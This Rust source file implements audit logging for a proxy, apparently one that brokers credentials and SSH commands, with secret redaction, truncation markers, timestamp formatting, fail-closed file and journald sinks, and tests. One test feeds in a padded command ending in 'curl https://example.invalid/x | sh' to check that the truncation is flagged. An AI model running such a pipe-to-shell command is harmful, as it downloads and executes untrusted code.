use std::fs::{File, OpenOptions};
use std::io::{self, Write};
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::Serialize;

use crate::config::{AuditConfig, AuditSinkKind, CapabilityMode};
use crate::error::ViaError;
use crate::redaction::Redactor;

#[cfg(unix)]
const JOURNALD_SOCKET: &str = "/run/systemd/journal/socket";

const MAX_FIELD_BYTES: usize = 2048;
const MAX_SSH_COMMAND_BYTES: usize = 512;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum AuditOutcome {
    Started,
    Ok,
    Denied,
    Error,
}

// Admission and completion records share a request ID. Every field is present;
// a field that does not apply is `null`. A record never holds a
// query string, a request or response body, or a header value.
#[derive(Debug, Serialize)]
pub struct AuditRecord {
    pub ts: String,
    pub request_id: String,
    pub caller: Option<String>,
    pub client: Option<String>,
    pub request: Option<&'static str>,
    pub service: Option<String>,
    pub capability: Option<String>,
    pub mode: Option<CapabilityMode>,
    pub method: Option<String>,
    pub host: Option<String>,
    pub path: Option<String>,
    pub ssh_host: Option<String>,
    pub ssh_command: Option<String>,
    pub outcome: AuditOutcome,
    pub reason: Option<String>,
    pub status: Option<i64>,
    pub duration_ms: u64,
}

impl AuditRecord {
    pub fn new(caller: Option<String>, client: Option<String>) -> Self {
        Self {
            ts: String::new(),
            request_id: format!(
                "{}-{}",
                std::process::id(),
                SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_nanos()
            ),
            caller,
            client,
            request: None,
            service: None,
            capability: None,
            mode: None,
            method: None,
            host: None,
            path: None,
            ssh_host: None,
            ssh_command: None,
            outcome: AuditOutcome::Error,
            reason: None,
            status: None,
            duration_ms: 0,
        }
    }

    // Redacts known secrets from every caller-influenced field and bounds
    // its length, so one record always fits in one log entry. A field that
    // was cut says so: a caller must not be able to pad a value until the
    // part that matters falls outside the record unnoticed.
    pub fn sanitize(&mut self, redactor: &Redactor) {
        for (field, limit) in [
            (&mut self.caller, MAX_FIELD_BYTES),
            (&mut self.client, MAX_FIELD_BYTES),
            (&mut self.service, MAX_FIELD_BYTES),
            (&mut self.capability, MAX_FIELD_BYTES),
            (&mut self.method, MAX_FIELD_BYTES),
            (&mut self.host, MAX_FIELD_BYTES),
            (&mut self.path, MAX_FIELD_BYTES),
            (&mut self.ssh_host, MAX_FIELD_BYTES),
            (&mut self.ssh_command, MAX_SSH_COMMAND_BYTES),
        ] {
            if let Some(value) = field {
                let mut redacted = redactor.redact(value);
                truncate_with_marker(&mut redacted, limit);
                *value = redacted;
            }
        }
    }

    pub fn to_json_line(&self) -> Result<String, ViaError> {
        Ok(serde_json::to_string(self)?)
    }
}

// Keeps at most `max_bytes` of the value. A cut value ends with a marker that
// gives its full length, such as `...[truncated; 4096 bytes]`.
fn truncate_with_marker(value: &mut String, max_bytes: usize) {
    let full_length = value.len();
    if full_length <= max_bytes {
        return;
    }

    let mut end = max_bytes;
    while !value.is_char_boundary(end) {
        end -= 1;
    }
    value.truncate(end);
    value.push_str(&format!("...[truncated; {full_length} bytes]"));
}

// RFC 3339 in UTC with millisecond precision, such as
// `2026-01-02T03:04:05.678Z`.
pub fn rfc3339_utc(time: SystemTime) -> String {
    let since_epoch = time.duration_since(UNIX_EPOCH).unwrap_or_default();
    let seconds = since_epoch.as_secs();
    let milliseconds = since_epoch.subsec_millis();
    let (year, month, day) = civil_from_days(seconds / 86_400);
    let second_of_day = seconds % 86_400;
    let hour = second_of_day / 3_600;
    let minute = (second_of_day % 3_600) / 60;
    let second = second_of_day % 60;

    format!("{year:04}-{month:02}-{day:02}T{hour:02}:{minute:02}:{second:02}.{milliseconds:03}Z")
}

// Converts days since 1970-01-01 to a proleptic Gregorian date.
fn civil_from_days(days_since_epoch: u64) -> (u64, u64, u64) {
    let shifted = days_since_epoch + 719_468;
    let era = shifted / 146_097;
    let day_of_era = shifted % 146_097;
    let year_of_era =
        (day_of_era - day_of_era / 1_460 + day_of_era / 36_524 - day_of_era / 146_096) / 365;
    let day_of_year = day_of_era - (365 * year_of_era + year_of_era / 4 - year_of_era / 100);
    let shifted_month = (5 * day_of_year + 2) / 153;
    let day = day_of_year - (153 * shifted_month + 2) / 5 + 1;
    let month = if shifted_month < 10 {
        shifted_month + 3
    } else {
        shifted_month - 9
    };
    let year = year_of_era + era * 400 + u64::from(month <= 2);

    (year, month, day)
}

// An opened audit destination. It is opened before a request runs so that a
// request is refused when its record could not be written.
pub struct AuditSink {
    target: SinkTarget,
}

enum SinkTarget {
    File(File),
    #[cfg(unix)]
    Journald(std::os::unix::net::UnixDatagram),
}

impl AuditSink {
    pub fn open(config: &AuditConfig) -> Result<Self, ViaError> {
        match config.sink {
            AuditSinkKind::File => {
                let path = config.path.as_deref().ok_or_else(|| {
                    ViaError::InvalidConfig(
                        "audit sink `file` requires an absolute `path`".to_owned(),
                    )
                })?;
                Self::open_file(path)
            }
            AuditSinkKind::Journald => Self::open_journald(),
        }
    }

    fn open_file(path: &Path) -> Result<Self, ViaError> {
        let mut options = OpenOptions::new();
        options.append(true).create(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;

            options.mode(0o600);
        }
        let file = options
            .open(path)
            .map_err(|source| unavailable("the audit file cannot be opened", &source))?;

        Ok(Self {
            target: SinkTarget::File(file),
        })
    }

    #[cfg(unix)]
    fn open_journald() -> Result<Self, ViaError> {
        Self::open_journald_at(Path::new(JOURNALD_SOCKET))
    }

    #[cfg(unix)]
    fn open_journald_at(socket_path: &Path) -> Result<Self, ViaError> {
        let socket = std::os::unix::net::UnixDatagram::unbound()
            .and_then(|socket| socket.connect(socket_path).map(|()| socket))
            .map_err(|source| unavailable("the journald socket cannot be reached", &source))?;

        Ok(Self {
            target: SinkTarget::Journald(socket),
        })
    }

    #[cfg(not(unix))]
    fn open_journald() -> Result<Self, ViaError> {
        Err(ViaError::AuditUnavailable(
            "the journald audit sink is unsupported on this platform".to_owned(),
        ))
    }

    pub fn write(&mut self, record: &AuditRecord) -> Result<(), ViaError> {
        let line = record.to_json_line()?;
        match &mut self.target {
            SinkTarget::File(file) => {
                // One write keeps concurrent appends from interleaving.
                let mut entry = line.into_bytes();
                entry.push(b'\n');
                file.write_all(&entry)
                    .map_err(|source| unavailable("the audit record cannot be written", &source))?;
                file.flush()
                    .map_err(|source| unavailable("the audit record cannot be written", &source))
            }
            #[cfg(unix)]
            SinkTarget::Journald(socket) => {
                let datagram = journald_datagram(&line, record.outcome);
                let sent = socket
                    .send(datagram.as_bytes())
                    .map_err(|source| unavailable("the audit record cannot be sent", &source))?;
                if sent == datagram.len() {
                    Ok(())
                } else {
                    Err(ViaError::AuditUnavailable(
                        "the audit record was truncated by the journald socket".to_owned(),
                    ))
                }
            }
        }
    }
}

// The journald native protocol: one `FIELD=value` line per field. The JSON
// line never contains a raw newline, so no length-prefixed form is needed.
#[cfg(unix)]
fn journald_datagram(line: &str, outcome: AuditOutcome) -> String {
    let priority = match outcome {
        AuditOutcome::Started | AuditOutcome::Ok => 6,
        AuditOutcome::Denied | AuditOutcome::Error => 5,
    };

    format!("MESSAGE={line}\nPRIORITY={priority}\nSYSLOG_IDENTIFIER=via\n")
}

fn unavailable(problem: &str, source: &io::Error) -> ViaError {
    ViaError::AuditUnavailable(format!("{problem}: {source}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::test_support::TempDir;

    fn record() -> AuditRecord {
        let mut record = AuditRecord::new(
            Some("sandbox-1".to_owned()),
            Some("198.51.100.7".to_owned()),
        );
        record.ts = rfc3339_utc(UNIX_EPOCH);
        record.request = Some("run");
        record.service = Some("github".to_owned());
        record.capability = Some("api".to_owned());
        record.mode = Some(CapabilityMode::Rest);
        record.method = Some("GET".to_owned());
        record.host = Some("api.github.com".to_owned());
        record.path = Some("/user".to_owned());
        record.outcome = AuditOutcome::Ok;
        record.status = Some(200);
        record.duration_ms = 12;
        record
    }

    #[test]
    fn formats_rfc3339_utc_timestamps() {
        use std::time::Duration;

        for (seconds, milliseconds, expected) in [
            (0, 0, "1970-01-01T00:00:00.000Z"),
            (86_399, 999, "1970-01-01T23:59:59.999Z"),
            (86_400, 0, "1970-01-02T00:00:00.000Z"),
            (951_782_400, 0, "2000-02-29T00:00:00.000Z"),
            (951_868_800, 0, "2000-03-01T00:00:00.000Z"),
            (1_700_000_000, 5, "2023-11-14T22:13:20.005Z"),
            (1_709_251_199, 0, "2024-02-29T23:59:59.000Z"),
            (1_735_689_600, 0, "2025-01-01T00:00:00.000Z"),
            (4_102_444_800, 0, "2100-01-01T00:00:00.000Z"),
            (4_107_542_400, 0, "2100-03-01T00:00:00.000Z"),
        ] {
            let time = UNIX_EPOCH + Duration::new(seconds, milliseconds * 1_000_000);

            assert_eq!(rfc3339_utc(time), expected);
        }
    }

    #[test]
    fn formatted_timestamps_parse_back_to_the_same_instant() {
        use std::time::Duration;

        use time::format_description::well_known::Rfc3339;
        use time::OffsetDateTime;

        let mut seconds = 0_u64;
        while seconds < 5_000_000_000 {
            let formatted = rfc3339_utc(UNIX_EPOCH + Duration::from_secs(seconds));
            let parsed = OffsetDateTime::parse(&formatted, &Rfc3339).unwrap();

            assert_eq!(
                u64::try_from(parsed.unix_timestamp()).unwrap(),
                seconds,
                "{formatted}"
            );
            // A step that is not a whole number of days visits many dates
            // and times of day.
            seconds += 2_147_483;
        }
    }

    #[test]
    fn serializes_every_field_with_stable_names() {
        let line = record().to_json_line().unwrap();
        let json: serde_json::Value = serde_json::from_str(&line).unwrap();
        let names = [
            "ts",
            "request_id",
            "caller",
            "client",
            "request",
            "service",
            "capability",
            "mode",
            "method",
            "host",
            "path",
            "ssh_host",
            "ssh_command",
            "outcome",
            "reason",
            "status",
            "duration_ms",
        ];

        // Every field is present, and fields are written in a fixed order.
        assert_eq!(json.as_object().unwrap().len(), names.len());
        let mut position = 0;
        for name in names {
            let key = format!("\"{name}\":");
            let Some(found) = line[position..].find(&key) else {
                panic!("field `{name}` is missing or out of order in {line}");
            };
            position += found + key.len();
        }
        assert_eq!(json["ts"], "1970-01-01T00:00:00.000Z");
        assert_eq!(json["caller"], "sandbox-1");
        assert_eq!(json["client"], "198.51.100.7");
        assert_eq!(json["request"], "run");
        assert_eq!(json["service"], "github");
        assert_eq!(json["capability"], "api");
        assert_eq!(json["mode"], "rest");
        assert_eq!(json["method"], "GET");
        assert_eq!(json["host"], "api.github.com");
        assert_eq!(json["path"], "/user");
        assert!(json["ssh_host"].is_null());
        assert!(json["ssh_command"].is_null());
        assert_eq!(json["outcome"], "ok");
        assert!(json["reason"].is_null());
        assert_eq!(json["status"], 200);
        assert_eq!(json["duration_ms"], 12);
        assert!(!line.contains('\n'));
    }

    #[test]
    fn serializes_denied_and_error_outcomes() {
        let mut denied = record();
        denied.outcome = AuditOutcome::Denied;
        denied.reason = Some("method_not_allowed".to_owned());
        denied.status = None;
        let json: serde_json::Value =
            serde_json::from_str(&denied.to_json_line().unwrap()).unwrap();
        assert_eq!(json["outcome"], "denied");
        assert_eq!(json["reason"], "method_not_allowed");
        assert!(json["status"].is_null());

        let mut failed = AuditRecord::new(None, None);
        failed.outcome = AuditOutcome::Error;
        let json: serde_json::Value =
            serde_json::from_str(&failed.to_json_line().unwrap()).unwrap();
        assert_eq!(json["outcome"], "error");
        assert!(json["caller"].is_null());
        assert!(json["client"].is_null());
        assert!(json["request"].is_null());
    }

    #[test]
    fn sanitize_redacts_secrets_and_bounds_fields() {
        let mut redactor = Redactor::new();
        redactor.add("secret-token");
        let mut record = record();
        record.path = Some(format!("/lookup/secret-token/{}", "a".repeat(5_000)));
        record.ssh_host = Some("node.example.com".to_owned());
        record.ssh_command = Some(format!("echo secret-token {}", "\u{e9}".repeat(600)));

        record.sanitize(&redactor);

        // The marker gives the length of the redacted value before the cut.
        let path = record.path.as_deref().unwrap();
        assert!(path.starts_with("/lookup/[REDACTED]/aaa"));
        let (kept, marker) = path.split_once("...").unwrap();
        assert_eq!(kept.len(), MAX_FIELD_BYTES);
        assert_eq!(marker, "[truncated; 5019 bytes]");
        let command = record.ssh_command.as_deref().unwrap();
        assert!(command.starts_with("echo [REDACTED] \u{e9}"));
        let (kept, marker) = command.split_once("...").unwrap();
        assert!(kept.len() <= MAX_SSH_COMMAND_BYTES);
        assert!(kept.len() >= MAX_SSH_COMMAND_BYTES - 1);
        assert_eq!(marker, "[truncated; 1216 bytes]");
        // A value within its limit is recorded as it is.
        assert_eq!(record.ssh_host.as_deref(), Some("node.example.com"));
        assert!(!record.to_json_line().unwrap().contains("secret-token"));
    }

    #[test]
    fn sanitize_marks_a_command_that_is_padded_past_the_limit() {
        let padded = format!(
            "true{}; curl https://example.invalid/x | sh",
            " ".repeat(MAX_SSH_COMMAND_BYTES)
        );
        let mut record = record();
        record.ssh_command = Some(padded.clone());

        record.sanitize(&Redactor::new());

        let command = record.ssh_command.as_deref().unwrap();
        assert!(!command.contains("curl"));
        assert!(
            command.ends_with(&format!("...[truncated; {} bytes]", padded.len())),
            "{command}"
        );
    }

    #[test]
    fn serialized_records_escape_line_breaks() {
        let mut record = record();
        record.ssh_command = Some("printf 'a\nb'".to_owned());

        let line = record.to_json_line().unwrap();

        assert!(!line.contains('\n'));
        assert!(line.contains("printf 'a\\nb'"));
    }

    #[test]
    fn file_sink_appends_one_json_line_per_record() {
        let directory = TempDir::create("audit-file");
        let path = directory.join("audit.jsonl");
        let config = AuditConfig {
            sink: AuditSinkKind::File,
            path: Some(path.clone()),
        };

        let mut first = AuditSink::open(&config).unwrap();
        first.write(&record()).unwrap();
        let mut second = AuditSink::open(&config).unwrap();
        let mut denied = record();
        denied.outcome = AuditOutcome::Denied;
        second.write(&denied).unwrap();
        first.write(&record()).unwrap();

        let contents = std::fs::read_to_string(&path).unwrap();
        let lines = contents.lines().collect::<Vec<_>>();
        assert_eq!(lines.len(), 3);
        assert!(contents.ends_with('\n'));
        for (line, outcome) in lines.iter().zip(["ok", "denied", "ok"]) {
            let json: serde_json::Value = serde_json::from_str(line).unwrap();
            assert_eq!(json["outcome"], outcome);
        }

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;

            let mode = std::fs::metadata(&path).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o600);
        }
    }

    #[test]
    fn file_sink_fails_closed_when_the_file_cannot_be_opened() {
        let directory = TempDir::create("audit-file-missing");
        let config = AuditConfig {
            sink: AuditSinkKind::File,
            path: Some(directory.join("absent").join("audit.jsonl")),
        };

        assert!(matches!(
            AuditSink::open(&config),
            Err(ViaError::AuditUnavailable(message)) if message.contains("cannot be opened")
        ));
        assert!(matches!(
            AuditSink::open(&AuditConfig {
                sink: AuditSinkKind::File,
                path: None,
            }),
            Err(ViaError::InvalidConfig(_))
        ));
    }

    #[cfg(unix)]
    #[test]
    fn journald_sink_sends_one_native_datagram() {
        use std::os::unix::net::UnixDatagram;
        use std::time::Duration;

        let directory = TempDir::create("audit-journald");
        let socket_path = directory.join("journal.sock");
        let receiver = UnixDatagram::bind(&socket_path).unwrap();
        receiver
            .set_read_timeout(Some(Duration::from_secs(10)))
            .unwrap();

        let mut sink = AuditSink::open_journald_at(&socket_path).unwrap();
        sink.write(&record()).unwrap();
        let mut denied = record();
        denied.outcome = AuditOutcome::Denied;
        denied.reason = Some("disabled".to_owned());
        sink.write(&denied).unwrap();

        let mut buffer = vec![0_u8; 64 * 1024];
        let received = receiver.recv(&mut buffer).unwrap();
        let datagram = String::from_utf8(buffer[..received].to_vec()).unwrap();
        let fields = datagram.lines().collect::<Vec<_>>();
        assert_eq!(fields.len(), 3);
        let message = fields[0].strip_prefix("MESSAGE=").unwrap();
        let json: serde_json::Value = serde_json::from_str(message).unwrap();
        assert_eq!(json["outcome"], "ok");
        assert_eq!(fields[1], "PRIORITY=6");
        assert_eq!(fields[2], "SYSLOG_IDENTIFIER=via");
        assert!(datagram.ends_with('\n'));

        let received = receiver.recv(&mut buffer).unwrap();
        let datagram = String::from_utf8(buffer[..received].to_vec()).unwrap();
        assert!(datagram.contains("\"reason\":\"disabled\""));
        assert!(datagram.contains("\nPRIORITY=5\n"));
    }

    #[cfg(unix)]
    #[test]
    fn journald_sink_fails_closed_without_a_socket() {
        let directory = TempDir::create("audit-journald-missing");

        assert!(matches!(
            AuditSink::open_journald_at(&directory.join("journal.sock")),
            Err(ViaError::AuditUnavailable(message)) if message.contains("journald socket")
        ));
    }
}
